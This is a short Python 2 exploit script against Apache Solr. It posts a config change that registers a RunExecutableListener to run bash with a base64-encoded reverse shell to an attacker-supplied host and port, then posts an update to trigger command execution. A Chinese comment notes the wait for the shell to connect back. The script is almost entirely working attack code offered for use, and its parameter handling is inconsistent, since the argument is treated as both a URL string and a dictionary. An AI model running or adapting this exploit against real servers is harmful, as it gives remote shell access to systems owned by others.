#-*-coding:utf-8-*-
import requests
import re
import txconfig
import time
import base64
import urllib2
import sys


def main(param):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0","Content-Type":"application/json"}

    result = {
        "success": False,
        "result": {}
    }
    try:
        url = param
    except Exception as e:
        result['result'] = e
        return result
    listener_host = param.get('lhost', '')
    listener_port = param.get('lport', '')
    shell = "bash -i >& /dev/tcp/" + str(listener_host) + "/" + str(listener_port) + " 0>&1"
    lis1 = base64.b64encode(shell)
    lis = "{echo," + lis1 + "}|{base64,-d}|{bash,-i}"
    s = urllib2.quote(lis)
    payload_1 = "/config"
    payload_2 = "/update"
    payload_data1 = '{"add-listener":{"event":"postCommit","name":"new00","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "'+str(s)+'"]}}'
    payload_data2 = '[{"id":"test"}]'
    url_1 = url + payload_1
    url_2 = url + payload_2
    Re = requests.post(url_1,headers = headers,data = payload_data1)
    Ree = requests.post(url_2,headers = headers,data = payload_data2)
    '''
    Ree_time = re.findall(r'QTime":(.*)}}\n',Ree.text,re.S)[0]
    time.sleep(int(Ree_time))
    反弹shell需要等待Ree_time s
    '''
    result['success'] = True
    return result


if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)
